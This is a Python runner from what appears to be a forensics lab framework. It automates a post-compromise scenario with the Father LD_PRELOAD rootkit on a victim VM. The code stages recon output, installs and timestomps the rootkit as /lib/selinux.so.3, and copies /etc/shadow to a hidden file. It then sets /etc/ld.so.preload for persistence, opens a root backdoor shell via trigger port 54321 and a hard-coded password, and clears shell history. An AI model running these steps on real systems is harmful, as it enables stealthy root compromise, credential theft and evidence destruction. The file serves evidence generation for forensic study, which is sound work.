"""Explicit runner for the Father LD_PRELOAD scenario.

Phases follow one deterministic post-compromise timeline: recon, staging,
implant installation with timestomping, credential harvesting, persistence
configuration, activation, a dwell interval, backdoor validation, and a
bounded cleanup. Ground-truth details here (paths, dwell durations, log
selection) are scenario design, not forensic findings; see METHODOLOGY.md for
the source-scoped language used once evidence is examined.
"""

from __future__ import annotations

import socket
import time
from collections.abc import Callable
from pathlib import Path

import yaml

from orchestrator.core import console
from orchestrator.core.provenance import file_sha256
from orchestrator.core.ssh_client import SSHClient
from scenarios.command_log import CommandLog

SCENARIO_ID = "user_ldpreload_father"
ROOT = Path(__file__).resolve().parent
ARCHIVE = ROOT / "files/father-upstream-4eb2712.tar"
BUILD_SCRIPT = ROOT / "files/build.sh"
LOCK = ROOT / "father.lock.yml"
ARTIFACT_NAME = "rk.so"

# Paths on the builder VM, used only by the build path.
_BUILDER_ARCHIVE = "/tmp/father-upstream-4eb2712.tar"
_BUILDER_SCRIPT = "/tmp/father-build.sh"
_BUILDER_BUILD_ROOT = "/tmp/father-build"

# Paths on the victim VM. This is the evidence surface a run leaves behind.
VICTIM_ARTIFACT = f"/tmp/{ARTIFACT_NAME}"

# Father defaults
INSTALLED_LIBRARY = "/lib/selinux.so.3"
PRELOAD_CONFIG = "/etc/ld.so.preload"
# Timestomp reference: a file already present on every Ubuntu 22.04 target, so
# the implant inherits a plausible system-library date instead of a planted one.
LIBC_REFERENCE = "/lib/x86_64-linux-gnu/libc.so.6"
SOURCE_PORT = 54321
SHELL_PASSWORD = b"lobster\0"
AUTHENTICATION_PROMPT = b"\n\nAUTHENTICATE: "
SHELL_MARKER = b"Enjoy the shell!"

# Only intentional Father customization
HIDDEN_PREFIX = "__malicious_"
HIDDEN_DIR = "/tmp"
LIST_HIDDEN_DIR = f"ls -la -- {HIDDEN_DIR}"

# Controlled local credential copy (T1003); never printed or exported.
HARVEST_FILE_NAME = f"{HIDDEN_PREFIX}harvest"
HARVEST_PATH = f"{HIDDEN_DIR}/{HARVEST_FILE_NAME}"

# T1074.001 local data staging: recon output is collected to a file under the
# hidden prefix rather than discarded, which is what makes the phase leave
# evidence at all. Kept separate from the credential copy so that file is never
# read back for any reason.
RECON_STAGE_FILE_NAME = f"{HIDDEN_PREFIX}recon"
RECON_STAGE_PATH = f"{HIDDEN_DIR}/{RECON_STAGE_FILE_NAME}"

# Both carry the hidden prefix, so both are what the readdir hook has to hide.
# Neither is removed by the cleanup: they are the surviving compromise.
STAGED_FILE_NAMES = (RECON_STAGE_FILE_NAME, HARVEST_FILE_NAME)

# Deterministic dwell durations (seconds). No randomness: five short dwells
# between phases plus one long dwell before validation spread the scenario
# timeline to approximately 90s; treat that figure as a target, not a claim.
DWELL_SHORT = 12
DWELL_LONG = 30

# T1033 execution identity, T1082 system discovery, T1087.001 local accounts,
# each staged as it is collected (T1074.001). The first three are teed to the
# console as well as the stage file; the account database is staged only
# (`>>`) with a concise marker printed instead, so the run doesn't echo every
# local account to the terminal transcript.
RECON_COMMANDS = (
    f"id | tee -a {RECON_STAGE_PATH}",
    f"uname -a | tee -a {RECON_STAGE_PATH}",
    f"cat /etc/os-release | tee -a {RECON_STAGE_PATH}",
    f"cat /etc/passwd >> {RECON_STAGE_PATH}",
)

INSTALL_IMPLANT = f"sudo -n install -m 0644 {VICTIM_ARTIFACT} {INSTALLED_LIBRARY}"
# T1070.006. touch -r resets atime and mtime from the reference file; ctime
# cannot be set this way and still records the real install time.
TIMESTOMP_IMPLANT = f"sudo -n touch -r {LIBC_REFERENCE} {INSTALLED_LIBRARY}"

# T1003. The copy is never read back, printed, or exported; only the directory
# listing that shows whether the file is visible is captured.
HARVEST_SHADOW = f"sudo -n install -m 0600 /etc/shadow {HARVEST_PATH}"

WRITE_PRELOAD_CONFIG = f"echo {INSTALLED_LIBRARY} | sudo -n tee {PRELOAD_CONFIG}"

RESTART_SSH = "sudo -n systemctl restart ssh.service"

CLEANUP_COMMANDS = (
    f"rm -f -- {VICTIM_ARTIFACT}",  # T1070.004
    "history -c",  # T1070.003
    'rm -f -- "${HISTFILE:-$HOME/.bash_history}"',
    "unset HISTFILE",
)
# T1070.002 log truncation is deliberately not part of the default cleanup:
# truncating /var/log/auth.log and /var/log/syslog would remove evidence that
# keeps the default run recoverable for investigation. See
# ai/father-refactor-plan.md for the evasion-variant follow-up.


def run_father(
    ssh: SSHClient,
    transcript_path: Path,
    *,
    command_log_path: Path,
    artifact_path: Path,
    build_record: dict,
) -> tuple[dict, Callable[[], None]]:
    """Run Father's phased activation and retain the live shell."""
    transcript_path.touch()
    terminal = ssh.open_terminal()
    log = CommandLog(terminal, command_log_path)
    backdoor_socket = None

    def close_backdoor_socket() -> None:
        nonlocal backdoor_socket
        if backdoor_socket is None:
            return
        backdoor_socket.close()
        backdoor_socket = None

    try:
        try:
            with terminal:
                # One deterministic post-compromise timeline. The dwells sit
                # between phases, so each phase bracket bounds its own commands.
                _verify_guest_identity(log, build_record)
                _recon(log)
                time.sleep(DWELL_SHORT)
                _stage_artifact(ssh, log, artifact_path)
                time.sleep(DWELL_SHORT)
                _install_implant(log)
                time.sleep(DWELL_SHORT)
                _harvest_credentials(log)
                time.sleep(DWELL_SHORT)
                _configure_persistence(log)
                time.sleep(DWELL_SHORT)
                _activate(log)

                with log.phase("dwell"):
                    time.sleep(DWELL_LONG)

                backdoor_socket, connection = _validate(log, ssh)
                _cleanup(log)
        finally:
            transcript_path.write_text(terminal.transcript, encoding="utf-8")
    except BaseException:
        close_backdoor_socket()
        raise

    return {"backdoor_connection": connection}, close_backdoor_socket


def build(
    ssh: SSHClient,
    staging: Path,
    source: dict,
) -> tuple[Path, str]:
    """Build the pinned Father object on its builder VM."""
    artifact = staging / ARTIFACT_NAME
    ssh.put(ARCHIVE, _BUILDER_ARCHIVE)
    ssh.put(BUILD_SCRIPT, _BUILDER_SCRIPT)
    console.step(f"building {ARTIFACT_NAME}...")
    stdout = ssh.run_checked(
        f"bash {_BUILDER_SCRIPT} {_BUILDER_ARCHIVE} "
        f"{_BUILDER_BUILD_ROOT} {HIDDEN_PREFIX}",
        timeout=1800,
    )
    ssh.get(
        f"{_BUILDER_BUILD_ROOT}/Father-{source['commit']}/{ARTIFACT_NAME}",
        artifact,
    )
    return artifact, stdout


def build_recipe() -> dict:
    """Return the exact scenario-owned build recipe recorded by the host."""
    return {
        "sha256": file_sha256(BUILD_SCRIPT),
        "hidden_prefix": HIDDEN_PREFIX,
    }


def verify_source() -> dict:
    """Check the vendored archive against the pinned lock. Host-side, no VM."""
    lock = yaml.safe_load(LOCK.read_text(encoding="utf-8"))
    archive_hash = file_sha256(ARCHIVE)
    expected_hash = lock["retrieval"]["archive_sha256"]
    if archive_hash != expected_hash:
        raise RuntimeError(
            "Father archive SHA-256 mismatch: "
            f"expected {expected_hash}, got {archive_hash}"
        )
    console.ok(f"Father source verified: {archive_hash}")
    return {
        "repository": lock["upstream"]["url"],
        "commit": lock["upstream"]["pinned_commit"],
        "archive_sha256": archive_hash,
    }


def _verify_guest_identity(log: CommandLog, build_record: dict) -> None:
    """Lab precondition: refuse to install an implant built for another target."""
    console.scope("GUEST", "verify prepared artifact")
    guest_identity = log.run(
        ". /etc/os-release; " 'printf \'%s-%s %s\\n\' "$ID" "$VERSION_ID" "$(uname -m)"'
    ).combined_output
    try:
        expected = (
            f"{build_record['target']['distro_id']} "
            f"{build_record['target']['arch']}"
        )
        if guest_identity != expected:
            raise RuntimeError(
                f"Father artifact targets {expected}, guest is {guest_identity}"
            )
    except Exception as exc:
        log.note("verify_guest_identity", error=str(exc))
        raise
    log.note("verify_guest_identity")


def _recon(log: CommandLog) -> None:
    with log.phase("recon"):
        console.scope("GUEST", "reconnaissance")
        for command in RECON_COMMANDS:
            log.run(command)


def _stage_artifact(
    ssh: SSHClient,
    log: CommandLog,
    artifact_path: Path,
) -> None:
    with log.phase("stage_artifact"):
        console.scope("HOST", "stage Father artifact")
        console.step(f"Uploading {artifact_path.name} to {VICTIM_ARTIFACT}...")
        try:
            ssh.put(artifact_path, VICTIM_ARTIFACT)
        except Exception as exc:
            log.note("upload_artifact", error=str(exc))
            raise
        log.note("upload_artifact")


def _install_implant(log: CommandLog) -> None:
    with log.phase("install_implant"):
        console.scope("GUEST", "install implant")
        log.run(INSTALL_IMPLANT)
        log.run(TIMESTOMP_IMPLANT)


def _harvest_credentials(log: CommandLog) -> None:
    with log.phase("harvest_credentials"):
        console.scope("GUEST", "harvest credentials")
        log.run(HARVEST_SHADOW)
        visible_listing = log.run(LIST_HIDDEN_DIR).combined_output
        for name in STAGED_FILE_NAMES:
            if name not in visible_listing:
                raise RuntimeError(f"{name} was not visible before activation")


def _configure_persistence(log: CommandLog) -> None:
    with log.phase("configure_persistence"):
        console.scope("GUEST", "configure persistence")
        log.run(WRITE_PRELOAD_CONFIG)


def _activate(log: CommandLog) -> None:
    with log.phase("activate"):
        console.scope("GUEST", "activate")
        log.run(RESTART_SSH)


def _validate(log: CommandLog, ssh: SSHClient) -> tuple[socket.socket, dict]:
    with log.phase("validate"):
        console.scope("GUEST", "validate implant behavior")
        hidden_listing = log.run(LIST_HIDDEN_DIR).combined_output
        if HARVEST_FILE_NAME in hidden_listing:
            raise RuntimeError(f"{HARVEST_FILE_NAME} remained visible after activation")
        # Father's readdir hook skips a matching entry by fetching exactly one
        # more, so two hidden names returned back to back leak the second. That
        # is an upstream flaw, not a lab failure: record which way it fell and
        # keep going, rather than losing the run to a directory-order coin flip.
        leaked = RECON_STAGE_FILE_NAME in hidden_listing
        log.note(
            "recon_stage_hidden",
            error="entry leaked through the readdir hook" if leaked else None,
        )

        console.scope("HOST", "validate Father backdoor")
        try:
            backdoor_socket, connection = _validate_backdoor(ssh)
        except Exception as exc:
            log.note("validate_backdoor", error=str(exc))
            raise
        log.note("validate_backdoor")
        return backdoor_socket, connection


def _cleanup(log: CommandLog) -> None:
    """T1070.003/.004: delete the staged artifact and clear shell history.

    Runs only after backdoor validation, so memory acquisition (taken from
    the still-running guest immediately after this scenario returns) observes
    the backdoor before any cleanup artifact is removed.
    """
    with log.phase("cleanup"):
        console.scope("GUEST", "cleanup")
        for command in CLEANUP_COMMANDS:
            log.run(command)


def _validate_backdoor(
    ssh: SSHClient,
) -> tuple[socket.socket, dict]:
    console.step(
        f"Connecting to {ssh.host}:{ssh.port} from Father trigger port "
        f"{SOURCE_PORT}..."
    )
    client = None
    try:
        client = socket.create_connection(
            (ssh.host, ssh.port),
            timeout=12,
            source_address=("", SOURCE_PORT),
        )
        client_address, client_port = client.getsockname()[:2]
        server_address, server_port = client.getpeername()[:2]
        connection = {
            "client_address": client_address,
            "client_port": client_port,
            "server_address": server_address,
            "server_port": server_port,
        }
        with client.makefile("rb") as response:
            response.read(len(AUTHENTICATION_PROMPT))
            client.sendall(SHELL_PASSWORD)
            if not any(SHELL_MARKER in line for line in response):
                raise RuntimeError("Father did not open the native shell")

            client.sendall(b"id\n")
            identity = next(
                (
                    line.decode(errors="replace").strip().removeprefix("\x1b[0m")
                    for line in response
                    if b"uid=0(root)" in line and b"gid=1337" in line
                ),
                None,
            )
        if identity is None:
            raise RuntimeError("Father shell did not return the expected root identity")
        console.ok(f'Father shell opened: "{SHELL_MARKER.decode()}"')
        console.ok(f"Father shell identity: {identity}")
        return client, connection
    except OSError as exc:
        if client is not None:
            client.close()
        raise RuntimeError(f"Father backdoor connection failed: {exc}") from exc
    except BaseException:
        if client is not None:
            client.close()
        raise
